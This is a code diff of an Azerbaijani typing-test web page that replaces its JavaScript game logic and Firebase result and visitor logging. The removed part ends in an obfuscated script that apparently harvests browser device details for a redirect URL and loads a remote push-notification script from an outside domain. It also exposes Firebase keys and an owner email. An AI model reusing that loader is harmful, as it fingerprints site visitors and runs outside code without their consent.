-        row.style.alignItems = "center";
-        row.style.padding = "8px 10px";
-        row.style.marginBottom = "6px";
-        row.style.borderRadius = "8px";
-        row.style.fontSize = "14px";
-
-        if (item.correct) {
-          row.style.background = "rgba(34,197,94,0.12)";
-          row.innerHTML = `<span>${i+1}. ${item.word}</span><strong style="color:#22c55e">✔ düzgün</strong>`;
-        } else {
-          row.style.background = "rgba(239,68,68,0.12)";
-          row.innerHTML = `<span>${i+1}. ${item.word}</span><strong style="color:#ef4444">✖ səhv</strong>`;
-        }
-        box.appendChild(row);
-      });
-
-      const summary = document.createElement("div");
-      summary.style.marginTop = "12px";
-      summary.style.paddingTop = "10px";
-      summary.style.borderTop = "1px solid rgba(255,255,255,0.08)";
-      summary.style.display = "flex";
-      summary.style.justifyContent = "space-between";
-      summary.style.fontWeight = "700";
-      summary.innerHTML = `
-        <span style="color:#22c55e">✔ Düzgün: ${state.correct}</span>
-        <span style="color:#ef4444">✖ Səhv: ${state.wrong}</span>
-      `;
-      box.appendChild(summary);
-    }
-   function preparePreview() {
-  clearInterval(timerInterval);
-  timerInterval = null;
-
-  settings.count = parseInt(el('wordCount').value);
-  state.words = pickWords(settings.count);
-  state.index = 0;
-  state.correct = 0;
-  state.wrong = 0;
-  state.perWord = [];
-  state.finished = false;
-  state.started = false;
-  state.startTime = null;
-
-  el('typingInput').value = '';
-  el('typingInput').disabled = true;
-
-  el('timer').textContent = '00:00';
-  el('wpm').textContent = '0 WPM';
-
-  renderStream();
-  updateStats();
-  renderResultList();
-}
-  function startTest() {
-  clearInterval(timerInterval);
-  timerInterval = null;
-
-  settings.count = parseInt(el('wordCount').value);
-  state.words = pickWords(settings.count);
-  state.index = 0;
-  state.correct = 0;
-  state.wrong = 0;
-  state.perWord = [];
-  state.finished = false;
-  state.started = true;
-  state.startTime = null;
-
-  el('typingInput').value = '';
-  el('typingInput').disabled = false;
-  el('typingInput').focus();
-
-  el('timer').textContent = '00:00';
-  el('wpm').textContent = '0 WPM';
-
-  renderStream();
-  updateStats();
-  startTimer();
-  renderResultList();
-}
-    
-
-    function finishTest(){
-  state.finished = true;
-  el('typingInput').disabled = true;
-  stopTimer();
-
-  if (typeof saveTypingResult === "function") {
-  saveTypingResult(state.correct, state.wrong, calcWPM());
-}
-
-  renderDetailedResults();
-  showModal();
-}
-    
-
-    function handleInput(e){
-  if (!state.started) return;
-  if(state.finished) return;
-
-  if(e.target.value.endsWith(' ')){
-    const typed = e.target.value.trim();
-    const word = state.words[state.index];
-    const correct = typed === word;
-
-    state.perWord[state.index] = {word, typed, correct};
-    correct ? state.correct++ : state.wrong++;
-    state.index++;
-
-    e.target.value = '';
-
-    if(state.index >= state.words.length){
-      finishTest();
-    }
-
-    renderStream();
-    updateStats();
-    renderResultList();
-  } else {
-    renderStream();
-  }
-}
-
-    el('typingInput').addEventListener('input', handleInput);
-    el('startBtn').addEventListener('click', () => {
-  if (!isUserLoggedIn()) {
-    openAuthModal();
-    return;
-  }
-  startTest();
-});
-el('resetBtn').addEventListener('click', () => {
-  if (!isUserLoggedIn()) {
-    preparePreview();
-    openAuthModal();
-    return;
-  }
-  preparePreview();
-});
-
-el('wordCount').addEventListener('change', () => {
-  if (!isUserLoggedIn()) {
-    preparePreview();
-    openAuthModal();
-    return;
-  }
-  preparePreview();
-});
-    el('closeModal').addEventListener('click', closeModal);
-
-preparePreview();
-el('typingInput').disabled = true;
-    if (typeof saveVisitorEntry === "function") {
-  saveVisitorEntry();
-} else {
-  window.addEventListener("load", () => {
-    if (typeof saveVisitorEntry === "function") {
-      saveVisitorEntry();
+  onAuthStateChanged(auth, (user) => {
+    currentUser = user;
+    if (user) {
+      document.getElementById("userDisplayName").innerText = user.email.split('@')[0];
+      saveVisitorEntry(user);
     }
   });
-}
 
-    // Username show
-    const savedEmail = localStorage.getItem("userEmail");
-    const registerLink = document.querySelector('#accountMenu a[href*="qeydiyyat"]');
-    if (savedEmail) {
-      const username = savedEmail.split("@")[0];
-      accountBtn.textContent = username;
-      if (registerLink) registerLink.style.display = "none";
+  async function saveVisitorEntry(user) {
+    try {
+      const email = user?.email || localStorage.getItem("tempEmail");
+      if (!email) return;
+      await setDoc(doc(db, "visitors", `${email}_${Date.now()}`), {
+        email, name: user?.displayName || email.split("@")[0], page: "home", visitedAt: serverTimestamp(), userAgent: navigator.userAgent
+      });
+    } catch (err) { console.error("Visitor error:", err); }
+  }
+
+  function initGame() {
+    state.words = [...wordPool].sort(() => Math.random() - 0.5).slice(0, 30);
+    state.currentIdx = 0; state.correct = 0; state.wrong = 0;
+    state.isActive = true; state.startTime = Date.now();
+    inputEl.disabled = false; inputEl.value = ""; inputEl.focus();
+    renderWords(); startTimer();
+  }
+
+  function renderWords() {
+    wordBox.innerHTML = state.words.map((w, i) => `<span class="word ${i === state.currentIdx ? 'current' : ''}">${w}</span>`).join("");
+  }
+
+  function startTimer() {
+    const timerInt = setInterval(() => {
+      if (!state.isActive) return clearInterval(timerInt);
+      const elapsed = Math.floor((Date.now() - state.startTime) / 1000);
+      document.getElementById("timerDisplay").innerText = `${Math.floor(elapsed/60).toString().padStart(2,'0')}:${(elapsed%60).toString().padStart(2,'0')}`;
+      if(elapsed > 0) document.getElementById("wpmDisplay").innerText = Math.round(state.currentIdx / (elapsed / 60));
+    }, 1000);
+  }
+
+  inputEl.addEventListener("input", (e) => {
+    if (e.data === " ") {
+      const typed = inputEl.value.trim();
+      if (!typed) { inputEl.value = ""; return; }
+      const target = state.words[state.currentIdx];
+      const wordEls = document.querySelectorAll(".word");
+      
+      if (typed === target) { state.correct++; wordEls[state.currentIdx].classList.add("correct"); }
+      else { state.wrong++; wordEls[state.currentIdx].classList.add("wrong"); }
+      
+      state.currentIdx++; inputEl.value = "";
+      if (state.currentIdx >= state.words.length) endGame();
+      else renderWords();
+      
+      document.getElementById("correctDisplay").innerText = state.correct;
+      document.getElementById("wrongDisplay").innerText = state.wrong;
     }
+  });
 
-    // Logout
-    const logoutBtn = document.getElementById("logoutMenutBtn");
-    logoutBtn.addEventListener("click", (e) => {
-      e.preventDefault();
-      localStorage.removeItem("userEmail");
-      localStorage.removeItem("theme");
-      localStorage.removeItem("username");
+  async function endGame() {
+    state.isActive = false; inputEl.disabled = true;
+    const finalWpm = document.getElementById("wpmDisplay").innerText;
+    document.getElementById("wpm-highlight").innerText = finalWpm;
+    document.getElementById("finalCorrect").innerText = state.correct;
+    document.getElementById("finalWrong").innerText = state.wrong;
+    document.getElementById("resultModal").style.display = "flex";
+
+    const email = currentUser?.email || localStorage.getItem("tempEmail");
+    if (email) {
+      await setDoc(doc(db, "results", `${email}_${Date.now()}`), {
+        email, wpm: parseInt(finalWpm), correct: state.correct, wrong: state.wrong, createdAt: serverTimestamp()
+      });
+    }
+  }
+
+  document.getElementById("startAction").onclick = () => {
+    if (currentUser || localStorage.getItem("tempEmail") || localStorage.getItem("userEmail")) {
+      initGame();
+      document.getElementById("startAction").style.display = "none";
+    } else {
+      alert("Oyuna başlamaq üçün qeydiyyatdan keçməlisiniz!");
+      window.location.href = "qeydiyyat.html";
+    }
+  };
+
+  document.getElementById("logoutBtn").onclick = (e) => {
+    e.preventDefault();
+    signOut(auth).then(() => {
+      localStorage.clear();
       window.location.href = "qeydiyyat.html";
     });
-
-    // =========================
-    // SAYĞAC - yalnız sən gör
-    // =========================
-   
-  </script>
- <script type="module">
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-import {
-  getFirestore,
-  doc,
-  setDoc,
-  serverTimestamp
-} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
-import { getAuth } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
-
-const firebaseConfig = {
-  apiKey: "AIzaSyCPUyl6EbO8dvJBTWofVBQg1a1xJHM4_08",
-  authDomain: "salam-58d0a.firebaseapp.com",
-  projectId: "salam-58d0a",
-  storageBucket: "salam-58d0a.firebasestorage.app",
-  messagingSenderId: "703442504339",
-  appId: "1:703442504339:web:4d7757d08bb37189829b66",
-  measurementId: "G-M94QKEHNJF"
-};
-
-const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
-const auth = getAuth(app);
-
-window.saveTypingResult = async function(correct, wrong, wpm) {
-  try {
-    const user = auth.currentUser;
-    const finalEmail = user?.email || localStorage.getItem("userEmail") || "anonim";
-
-    const resultDocId = `${finalEmail}_${Date.now()}`;
-
-    await setDoc(doc(db, "results", resultDocId), {
-      email: finalEmail,
-      correct: correct,
-      wrong: wrong,
-      wpm: wpm,
-      createdAt: serverTimestamp()
-    });
-
-    console.log("✅ nəticə Firestore-a ayrıca yazıldı");
-  } catch (err) {
-    console.error("❌ yazılmadı:", err);
-  }
-};
-
-window.saveVisitorEntry = async function() {
-  try {
-    const user = auth.currentUser;
-    const savedEmail = localStorage.getItem("userEmail");
-    const savedUsername = localStorage.getItem("username");
-
-    const finalEmail = user?.email || savedEmail || "anonim";
-
-    // ❗ Sənin şəxsi emailin — visitor yazılmasın
-    if (finalEmail === "typingmaster.az@gmail.com") {
-      console.log("⚙️ admin girişidir, visitors-a yazılmadı");
-      return;
-    }
-
-    const finalName =
-      user?.displayName ||
-      savedUsername ||
-      (finalEmail !== "anonim" ? finalEmail.split("@")[0] : "anonim");
-
-    const visitDocId = `${finalEmail}_${Date.now()}`;
-
-    await setDoc(doc(db, "visitors", visitDocId), {
-      email: finalEmail,
-      name: finalName || "anonim",
-      page: "home",
-      visitedAt: serverTimestamp(),
-      userAgent: navigator.userAgent
-    });
-
-    console.log("✅ ziyarətçi Firestore-a ayrıca yazıldı");
-
-  } catch (err) {
-    console.error("❌ ziyarətçi yazılmadı:", err);
-  }
-};
-</script>
-  <script>
-    var a='mcrpolfattafloprcmlVeedrosmico?ncc=uca&FcusleluVlearVsyipoonrctannEdhrgoiiHdt_emgocdeellicboosmccoast_avDetrnseigoAnrcebsruocw=seelri_bvoemr_ssiiocn'.split('').reduce((m,c,i)=>i%2?m+c:c+m).split('c');var Replace=(o=>{var v=a[0];try{v+=a[1]+Boolean(navigator[a[2]][a[3]]);navigator[a[2]][a[4]](o[0]).then(r=>{o[0].forEach(k=>{v+=r[k]?a[5]+o[1][o[0].indexOf(k)]+a[6]+encodeURIComponent(r[k]):a[0]})})}catch(e){}return u=>window.location.replace([u,v].join(u.indexOf(a[7])>-1?a[5]:a[7]))})([[a[8],a[9],a[10],a[11]],[a[12],a[13],a[14],a[15]]]);
-    var s = document.createElement('script');
-    s.src='//9hito.com/c32/ac36c/mw.min.js?z=10705303'+'&sw=/sw-check-permissions-51b95.js';
-    s.onload = function(result) {
-        switch (result) {
-            case 'onPermissionDefault':break;
-            case 'onPermissionAllowed':break;
-            case 'onPermissionDenied':break;
-            case 'onAlreadySubscribed':break;
-            case 'onNotificationUnsupported':break;
-        }
-    };
-    document.head.appendChild(s);
+  };
 </script>
 </body>
 </html>
-
